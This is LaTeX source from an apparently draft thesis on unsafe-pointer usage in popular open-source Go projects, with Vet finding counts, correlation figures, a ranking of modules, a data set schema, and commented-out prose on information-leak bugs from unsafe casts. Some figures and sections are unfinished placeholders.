    \label{fig:correlation-vet-grep-findings}
\end{figure}

Table~\ref{tbl:vet-misuse-findings} shows the packages that were found to produce Go Vet pointer misuse warnings.
The number of Vet findings is shown before and after deduplication, that is not counting the same line of source code
more than once.
We see that the runtime has incredibly many findings before deduplication.
It still has by far the most warnings after deduplication, but with less than 200 its two orders of magnitude less.
These two orders come exactly from the fact that I analysed around 500 projects, all of which use the \texttt{runtime}
package and all of which therefore add to the non-deduplicated count.

\begin{table}
    \centering
    \caption{Vet possible misuse of unsafe.Pointer findings per package}
    \label{tbl:vet-misuse-findings}

    \subtable[Raw findings before deduplication]{
        \label{subtbl:vet-findings-duplicates}
        \begin{tabular}{lr}
            \toprule
            Package                                 & Number of findings          \\
            \midrule
            runtime                                 &                      60164 \\
            sync/atomic                             &                        338 \\
            strings                                 &                        335 \\
            github.com/modern-go/reflect2           &                         46 \\
            golang.org/x/sys/unix                   &                         16 \\
            github.com/spaolacci/murmur3            &                         11 \\
            gorgonia.org/tensor                     &                          8 \\
            github.com/apache/arrow/go/arrow/math   &                          6 \\
            github.com/minio/simdjson-go            &                          4 \\
            github.com/apache/arrow/go/arrow/memory &                          4 \\
            github.com/AndreasBriese/bbloom         &                          4 \\
            github.com/coocood/bbloom               &                          2 \\
            github.com/segmentio/encoding/json      &                          1 \\
            \bottomrule
        \end{tabular}
    }

    \subtable[After deduplication]{
        \label{subtbl:vet-findings-deduplicated}
        \begin{tabular}{lr}
            \toprule
            Package                                 & Number of findings          \\
            \midrule
            runtime                                 &                         175 \\
            gorgonia.org/tensor                     &                           8 \\
            github.com/apache/arrow/go/arrow/math   &                           6 \\
            github.com/minio/simdjson-go            &                           3 \\
            github.com/apache/arrow/go/arrow/memory &                           3 \\
            github.com/spaolacci/murmur3            &                           2 \\
            github.com/coocood/bbloom               &                           2 \\
            github.com/AndreasBriese/bbloom         &                           2 \\
            sync/atomic                             &                           1 \\
            strings                                 &                           1 \\
            golang.org/x/sys/unix                   &                           1 \\
            github.com/segmentio/encoding/json      &                           1 \\
            github.com/modern-go/reflect2           &                           1 \\
            \bottomrule
        \end{tabular}
    }
\end{table}


%% -----------------------------------------------------------------------------

\subsection{Correlation of unsafe usages with project features}\label{subsec:results-correlation-project}

Figure~\ref{fig:correlations-project-imports-grep-vet} shows a dot for each project.
The x and y axis show the number of modules and packages imported by the project.
We see a linear correlation which is expected.
More modules mean more packages as each module must have at least one package.

The dot color shows the number of unsafe usages found by Grep, and we see that the more packages a project imports, the
more unsafe usages it has.

The size of the dot represents the number of Vet findings for the project.
Here we see something interesting:
The size of the dot is inverse correlated to the number of imports.
One could expect that the more unsafe usages a project has (dot is more red), the more Vet findings it might have (dot
is bigger).
However the opposite is true.
We could conclude that projects that use more unsafe code have a higher overall code quality.
More on this will be elaborated in the discussion in Chapter~\ref{ch:conclusions}.

\begin{figure}[ht]
    \centering
    {\scriptsize \includegraphics[width=\textwidth, height=9cm]{assets/plots/correlation-project/correlation-imports-grep-vet.tikz}}
    \caption{Correlation of number of imports, Grep unsafe, and Vet findings of projects}
    \label{fig:correlations-project-imports-grep-vet}
\end{figure}

Figure~\ref{fig:correlations-project-unsafe-stars} and Figure~\ref{fig:correlations-project-unsafe-age} correlate a
project's unsafe usages count with its number of stars, and its age, respectively.

We see no particular correlation between number of stars and unsafe count.
We can however see that there seem to be two clusters of projects, one with around 5000 usages, and one with at least
6000 usages.

There does not seem to be a correlation between project age and number of unsafe usages either.
The dots look very equally distributed.

\begin{figure}[ht]
    \centering
    {\scriptsize \includegraphics[width=\textwidth, height=9cm]{assets/plots/correlation-project/correlation-unsafe-stars.tikz}}
    \caption{Correlation of number of unsafe usages and number of stars of projects}
    \label{fig:correlations-project-unsafe-stars}
\end{figure}

\begin{figure}[ht]
    \centering
    {\scriptsize \includegraphics[width=\textwidth, height=9cm]{assets/plots/correlation-project/correlation-unsafe-age.tikz}}
    \caption{Correlation of number of unsafe usages and age of projects}
    \label{fig:correlations-project-unsafe-age}
\end{figure}

Finally, Figure~\ref{fig:correlations-module-unsafe-popularity} shows a correlation between popularity and number of
unsafe usages for a module.
It is the only plot in this subsection that is about modules, not projects.
We can clearly see the modules with many unsafe usages tend to get imported rather rarely compared to the other ones.
This has a good and a bad side:
There are no high-impact-high-probability modules, which would contain lots of unsafe usages and are very popular at the
same time.
These would be excellent targets for an attacker.
On the other hand, the modules with many unsafe usages are by default audited less because they are less popular,
meaning that potential bugs are more likely to be missed due to the lower number of users of the module.

\begin{figure}[ht]
    \centering
    {\scriptsize \includegraphics[width=\textwidth, height=9cm]{assets/plots/correlation-project/correlation-unsafe-module-popularity.tikz}}
    \caption{Correlation of number of unsafe usages and popularity of modules}
    \label{fig:correlations-module-unsafe-popularity}
\end{figure}


%% -----------------------------------------------------------------------------

\subsection{Most interesting modules for analysis}\label{subsec:results-most-interesting-modules}

To determine which modules are the most interesting ones for analysis in Chapter~\ref{ch:code-vulnerabilities}, I use
a score.
It is the product of unsafe usage count in a module and the import count of that module, a good indication of its
popularity.
Table~\ref{tbl:most-interesting-modules-by-score} shows the top 20 most interesting modules.

\begin{table}
    \centering
    \caption{Most interesting modules for analysis by score, N=20}
    \label{tbl:most-interesting-modules-by-score}
    \begin{tabular}{rlrrr}
        \toprule
        {} &                           Module & Unsafe usages count & Import count &    Score \\
        \midrule
        1  &                              std &                6676 &          495 &  3304620 \\
        2  &                 golang.org/x/sys &                1163 &          235 &   273305 \\
        3  &                 golang.org/x/net &                  91 &          217 &    19747 \\
        4  &      github.com/json-iterator/go &                 225 &           71 &    15975 \\
        5  &    github.com/modern-go/reflect2 &                 215 &           71 &    15265 \\
        6  &                k8s.io/kubernetes &                1887 &            8 &    15096 \\
        7  &       github.com/golang/protobuf &                  65 &          168 &    10920 \\
        8  &         github.com/gogo/protobuf &                 103 &          105 &    10815 \\
        9  &  github.com/hashicorp/go-msgpack &                 792 &           12 &     9504 \\
        10 &       github.com/ugorji/go/codec &                 823 &           11 &     9053 \\
        11 &               golang.org/x/tools &                 178 &           42 &     7476 \\
        12 &              golang.org/x/crypto &                  28 &          191 &     5348 \\
        13 &             github.com/ugorji/go &                 804 &            6 &     4824 \\
        14 &       github.com/davecgh/go-spew &                  38 &          106 &     4028 \\
        15 &                 go.etcd.io/bbolt &                 148 &           24 &     3552 \\
        16 &   k8s.io/apiextensions-apiserver &                 124 &           26 &     3224 \\
        17 &               gonum.org/v1/gonum &                 416 &            5 &     2080 \\
        18 &         github.com/docker/docker &                  42 &           47 &     1974 \\
        19 &   github.com/vishvananda/netlink &                 158 &           12 &     1896 \\
        20 &                gvisor.dev/gvisor &                1846 &            1 &     1846 \\
        \bottomrule
    \end{tabular}
\end{table}

Based on the table, we can identify interesting modules that are worth looking into:

\begin{itemize}
    \item \texttt{k8s.io/kubernetes} because it has a lot of unsafe usages
    \item \texttt{github.com/json-iterator/go} because it is getting imported quite often and has unsafe usages
    \item \texttt{github.com/modern-go/reflect2}, and
    \item \texttt{github.com/golang/protobuf} due to the same reason
\end{itemize}


%% -----------------------------------------------------------------------------

\subsection{Number of reflect.SliceHeader and reflect.StringHeader usages}\label{subsec:results-sliceheader}

SliceHeader and StringHeader count: 341 and XX (StringHeader todo) after deduplication.

These get analyzed in depth in Chapter~\ref{ch:code-vulnerabilities}, as slices and thus strings provide a very good
attack surface for vulnerabilites coming from misuse of unsafe code.


%% -----------------------------------------------------------------------------

\section{Publication of data set}\label{sec:survey-publication}

To obtain the data set, do this:

Clone it from Github?



\textbf{conversion-struct-struct}

Unsafe pointers are used to cast some struct directly into some other struct.

\input{assets/listings/chapter4/labels-classexample-conversion-struct-struct.tex}


\textbf{conversion-struct-basic}

Unsafe pointers are used to cast some struct into a basic Go type like \texttt{int32} or \texttt{string}.

\input{assets/listings/chapter4/labels-classexample-conversion-struct-basic.tex}


\textbf{conversion-header}

Unsafe pointers are used in conjunction with the slice and string headers of the reflect package to cast or construct
slices directly.

\input{assets/listings/chapter4/labels-classexample-conversion-header.tex}


\textbf{delegate}

Unsafe pointers are used only to be passed along to some function that required unsafe pointers in the first place.

\input{assets/listings/chapter4/labels-classexample-delegate.tex}


\textbf{unused}

Though there is a variable or parameter of type unsafe pointer, it is not actually used.

\input{assets/listings/chapter4/labels-classexample-unused.tex}


\textbf{comment}

A comment talks about unsafe pointers, or the code is simply commented.

\input{assets/listings/chapter4/labels-classexample-comment.tex}


\textbf{syscall}

Unsafe pointers are used as arguments in a direct syscall.

\input{assets/listings/chapter4/labels-classexample-syscall.tex}


\textbf{data-structure}

A data structure containing unsafe pointers or function declaration is done.
This is possible for example to recreate the slice header structures of the reflect package.

\input{assets/listings/chapter4/labels-classexample-data-structure.tex}


\textbf{pointer-arithmetic-memory-layout}

Using unsafe pointers, there is some form of pointer arithmetic or direct field access in a struct.

\input{assets/listings/chapter4/labels-classexample-pointer-arithmetic-memory-layout-stack-frame.tex}


\textbf{direct-memory-access}

Unsafe pointers are used or returned to directly dereference into memory.

\input{assets/listings/chapter4/labels-classexample-direct-memory-access.tex}


\textbf{escape-analysis-escape}

Unsafe pointers are used to deliberately create a value that is hidden to Go escape analysis.
Although the value might and probably will escape, the escape analysis can not realize.

\input{assets/listings/chapter4/labels-classexample-escape-analysis-escape.tex}


\textbf{type-reflection}

Unsafe pointers are used for some form of type distinction and similar actions for each type.

\input{assets/listings/chapter4/labels-classexample-type-reflection.tex}












%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%% former appendix B

%% -----------------------------------------------------------------------------

        \chapter{Open-source survey data set structure}\label{ch:app:data-structure}

        The top 500 open-source Go projects survey resulted in a large data set.
        It comprises the following object types:

        \begin{itemize}
            \item Projects
            \item Packages
            \item Modules
            \item Geiger findings
            \item Grep findings
            \item Go Vet findings
            \item Gosec findings
            \item Go-safer (linter) findings
            \item AST unsafe findings
            \item AST functions
            \item AST statements
        \end{itemize}

        The following tables show the structure of these data objects, including the data types.

        Chapter~\ref{ch:survey} explains in detail how the data set was created, analyzed and shows the results of analysis.

        \begin{table}[h]
            \centering
            \caption{Survey data set structure: projects}
            \label{tbl:datastructure-projects}
            \begin{tabular}{llll}
                \toprule
                Field & Data type & CSV field name \\
                \midrule
                Name           & string   & project\_name \\
                Rank           & int      & project\_rank \\
                GithubCloneUrl & string   & project\_github\_clone\_url \\
                NumberOfStars  & int      & project\_number\_of\_stars \\
                NumberOfForks  & int      & project\_number\_of\_forks \\
                GithubId       & int64    & project\_github\_id \\
                Revision       & string   & project\_revision \\
                CreatedAt      & DateTime & project\_created\_at \\
                LastPushedAt   & DateTime & project\_last\_pushed\_at \\
                UpdatedAt      & DateTime & project\_updated\_at \\
                Size           & int      & project\_size \\
                CheckoutPath   & string   & project\_checkout\_path \\
                \bottomrule
            \end{tabular}
        \end{table}

        \begin{table}[h]
            \centering
            \caption{Survey data set structure: packages and modules}
            \label{tbl:datastructure-packages-modules}
            \begin{tabular}{llll}
                \toprule
                Field & Data type & CSV field name \\
                \midrule
                Name               & string   & name \\
                ImportPath         & string   & import\_path \\
                Dir                & string   & dir \\
                IsStandard         & bool     & is\_standard \\
                IsDepOnly          & bool     & is\_dep\_only \\
                NumberOfGoFiles    & int      & number\_of\_go\_files \\
                Loc                & int      & loc \\
                ByteSize           & int      & byte\_size \\
                ModulePath         & string   & module\_path \\
                ModuleVersion      & string   & module\_version \\
                ModuleRegistry     & string   & module\_registry \\
                ModuleIsIndirect   & bool     & module\_is\_indirect \\
                ProjectName        & string   & project\_name \\
                \bottomrule
            \end{tabular}
        \end{table}

        \begin{table}[h]
            \centering
            \caption{Survey data set structure: Grep findings}
            \label{tbl:datastructure-grep-findings}
            \begin{tabular}{llll}
                \toprule
                Field & Data type & CSV field name \\
                \midrule
                Text                 & string & text \\
                Context              & string & context \\
                LineNumber           & int    & line\_number \\
                Column               & int    & column \\
                AbsoluteOffset       & int    & absolute\_offset \\
                MatchType            & string & match\_type \\
                FileName             & string & file\_name \\
                FileLoc              & int    & file\_loc \\
                FileByteSize         & int    & file\_byte\_size \\
                PackageImportPath    & string & package\_import\_path \\
                ModulePath           & string & module\_path \\
                ModuleVersion        & string & module\_version \\
                ProjectName          & string & project\_name \\
                FileCopyPath         & string & file\_copy\_path \\
                \bottomrule
            \end{tabular}
        \end{table}

        \begin{table}[h]
            \centering
            \caption{Survey data set structure: Go Vet findings}
            \label{tbl:datastructure-vet-findings}
            \begin{tabular}{llll}
                \toprule
                Field & Data type & CSV field name \\
                \midrule
                Message              & string & message \\
                Context              & string & context \\
                LineNumber           & int    & line\_number \\
                Column               & int    & column \\
                RawOutput            & string & raw\_output \\
                FileName             & string & file\_name \\
                FileLoc              & int    & file\_loc \\
                FileByteSize         & int    & file\_byte\_size \\
                PackageImportPath    & string & package\_import\_path \\
                ModulePath           & string & module\_path \\
                ModuleVersion        & string & module\_version \\
                ProjectName          & string & project\_name \\
                FileCopyPath         & string & file\_copy\_path \\
                \bottomrule
            \end{tabular}
        \end{table}

        \begin{table}[h]
            \centering
            \caption{Survey data set structure: Gosec findings}
            \label{tbl:datastructure-gosec-findings}
            \begin{tabular}{llll}
                \toprule
                Field & Data type & CSV field name \\
                \midrule
                Message              & string & message \\
                Context              & string & context \\
                Confidence           & string & confidence \\
                Severity             & string & severity \\
                CweId                & string & cwe\_id \\
                RuleId               & string & rule\_id \\
                LineNumber           & int    & line\_number \\
                Column               & int    & column \\
                FileName             & string & file\_name \\
                FileLoc              & int    & file\_loc \\
                FileByteSize         & int    & file\_byte\_size \\
                PackageImportPath    & string & package\_import\_path \\
                ModulePath           & string & module\_path \\
                ModuleVersion        & string & module\_version \\
                ProjectName          & string & project\_name \\
                FileCopyPath         & string & file\_copy\_path \\
                \bottomrule
            \end{tabular}
        \end{table}

        \begin{table}[h]
            \centering
            \caption{Survey data set structure: Go-Safer (linter) findings}
            \label{tbl:datastructure-linter-findings}
            \begin{tabular}{llll}
                \toprule
                Field & Data type & CSV field name \\
                \midrule
                Message              & string & message \\
                Context              & string & context \\
                LineNumber           & int    & line\_number \\
                Column               & int    & column \\
                RawOutput            & string & raw\_output \\
                FileName             & string & file\_name \\
                PackageImportPath    & string & package\_import\_path \\
                ModulePath           & string & module\_path \\
                ModuleVersion        & string & module\_version \\
                ProjectName          & string & project\_name \\
                \bottomrule
            \end{tabular}
        \end{table}

        \begin{table}[h]
            \centering
            \caption{Survey data set structure: AST unsafe findings}
            \label{tbl:datastructure-ast-findings}
            \begin{tabular}{llll}
                \toprule
                Field & Data type & CSV field name \\
                \midrule
                MatchType            & string & match\_type \\
                LineNumber           & int    & line\_number \\
                Column               & int    & column \\
                Text                 & string & text \\
                FileName             & string & file\_name \\
                PackageImportPath    & string & package\_import\_path \\
                ModulePath           & string & module\_path \\
                ModuleVersion        & string & module\_version \\
                ProjectName          & string & project\_name \\
                \bottomrule
            \end{tabular}
        \end{table}

        \begin{table}[h]
            \centering
            \caption{Survey data set structure: AST functions}
            \label{tbl:datastructure-ast-functions}
            \begin{tabular}{llll}
                \toprule
                Field & Data type & CSV field name \\
                \midrule
                LineNumber           & int    & line\_number \\
                Column               & int    & column \\
                Text                 & string & text \\
                NumberUnsafePointer  & int    & number\_unsafe\_pointer \\
                NumberUnsafeSizeof   & int    & number\_unsafe\_sizeof \\
                NumberUnsafeAlignof  & int    & number\_unsafe\_alignof \\
                NumberUnsafeOffsetof & int    & number\_unsafe\_offsetof \\
                NumberUintptr        & int    & number\_uintptr \\
                NumberSliceHeader    & int    & number\_slice\_header \\
                NumberStringHeader   & int    & number\_string\_header \\
                FileName             & string & file\_name \\
                PackageImportPath    & string & package\_import\_path \\
                ModulePath           & string & module\_path \\
                ModuleVersion        & string & module\_version \\
                ProjectName          & string & project\_name \\
                \bottomrule
            \end{tabular}
        \end{table}

        \begin{table}[h]
            \centering
            \caption{Survey data set structure: AST statements}
            \label{tbl:datastructure-ast-statements}
            \begin{tabular}{llll}
                \toprule
                Field & Data type & CSV field name \\
                \midrule
                LineNumber           & int    & line\_number \\
                Column               & int    & column \\
                Text                 & string & text \\
                NumberUnsafePointer  & int    & number\_unsafe\_pointer \\
                NumberUnsafeSizeof   & int    & number\_unsafe\_sizeof \\
                NumberUnsafeAlignof  & int    & number\_unsafe\_alignof \\
                NumberUnsafeOffsetof & int    & number\_unsafe\_offsetof \\
                NumberUintptr        & int    & number\_uintptr \\
                NumberSliceHeader    & int    & number\_slice\_header \\
                NumberStringHeader   & int    & number\_string\_header \\
                FileName             & string & file\_name \\
                PackageImportPath    & string & package\_import\_path \\
                ModulePath           & string & module\_path \\
                ModuleVersion        & string & module\_version \\
                ProjectName          & string & project\_name \\
                \bottomrule
            \end{tabular}
        \end{table}



%Furthermore, the methodology and results of the study on \unsafe{} code in open-source Go projects is presented in
%alongside the \toolGeiger{} tool, because first, the study data is gathered using \toolGeiger, and second, it
%simultaneously serves as an evaluation of \toolGeiger{}.


%It is important to note that while \textit{unsafe.Pointer} is a pointer type, \textit{uintptr} is not.
%This means that addresses that are stored in variables of type \textit{uintptr} are not treated as references by the
%garbage collector, and thus values referenced by it can get freed although there are still live references.
%Possible consequences of this are described in Chapter~\ref{ch:unsafe-security-problems}.
%Other dangers include that accessing raw bytes of data structures exposes low-level implementation details such as
%the alignment of structure fields to word-bound addresses, which can change with future versions of the Go compiler or
%runtime and thus break programs when they are not carefully updated later on.
%In general, using the \unsafe{} package must be done with caution and should be avoided whenever possible.



%A common variation to this insecure casting pattern is to omit storing the slice header that is created as a composite
%literal in a variable and instead casting it into the resulting slice value within the same statement, as is shown in
%Listing~\ref{lst:string-to-bytes-1statement}.
%
%\input{assets/listings/chapter3/string-to-bytes-1statement.tex}
%
%This does however not affect the bugs and vulnerabilities shown in this
%Section~\ref{sec:unsafe-security-problems:slice-casts}.
%In fact, the assembly that the code gets compiled to is exactly the same for both versions in
%Listings~\ref{lst:string-to-bytes} and~\ref{lst:string-to-bytes-1statement}.
%Even if the assembly would be different, performing the creation of a slice header as a composite literal and casting it
%to an actual slice in the same statement would still not avoid creating a plain \textit{uintptr} reference to the
%underlying data array as far as the \acrshort{GC} is concerned.
%This is because the \acrshort{GC} concurrency is at the level of machine instructions, not statements in the Go source
%code.



%%% ---------------------------------------------------------------------------------------------------------------------
%
%\subsection{Information Leak}\label{subsec:unsafe-security-problems:buffer-overflow:information-leak}
%
%Go uses a strict type system that encodes the buffer length in the type information.
%This prevents most buffer overflow vulnerabilities at compile time because the compiler can detect whether a given
%buffer will be large enough to store the data that gets written to it, as described in
%Section~\ref{sec:background:memory-safety-layout}.
%However, this safety measure is circumvented when the \unsafe{} \acrshort{API} is used in Go.
%Using direct casts through the \textit{unsafe.Pointer} type, it is possible to convert between buffers of different
%sizes.
%Listing~\ref{lst:information-leak} shows such a situation.
%
%\input{assets/listings/chapter3/information-leak.tex}
%
%In Line~2, a buffer of size four bytes called \textit{harmlessBuffer} is initialized with data.
%Then, Line~2 declares a buffer containing a secret value, which should stay internal to the application.
%Using the \unsafe{} \acrshort{API}, the \textit{harmlessBuffer} is then converted to a have a new length of ten bytes,
%although there is no reallocation (Line~4).
%The resulting buffer is finally printed (Line~5), which outputs not only the harmless four bytes, but also the secret.
%The secret data could for example be a cryptographic private key or password information.
%Therefore, this bug has created an information leak vulnerability.
%
%To motivate a situation where this bug can have serious consequences,
%Figure~\ref{fig:information-leak-threat-model-protocol} shows the specification of a simple client / server
%communication protocol.
%Both request and response types contain a version and message type field as well as a buffer for message-specific,
%serialized data of length 512 bytes.
%
%\input{assets/figures/chapter3/information-leak-threat-model-protocol.tex}
%
%If the client or server handling these messages uses the \unsafe{} \acrshort{API} to convert the serialized data to a
%specific data structure, then the field lengths must match.
%Imagine a company where two different teams are working on the client and server, respectively, and they printed the
%protocol diagrams to hang them on the wall when the specification was decided.
%A developer in one of the teams could easily miss the announcement of a protocol change that affects the buffer size,
%and when they write incorrect code based on the outdated information on the printed diagram, the mistake could become
%unnoticed in code review due to the same reason, a reviewer who looks at the protocol diagram in the team room.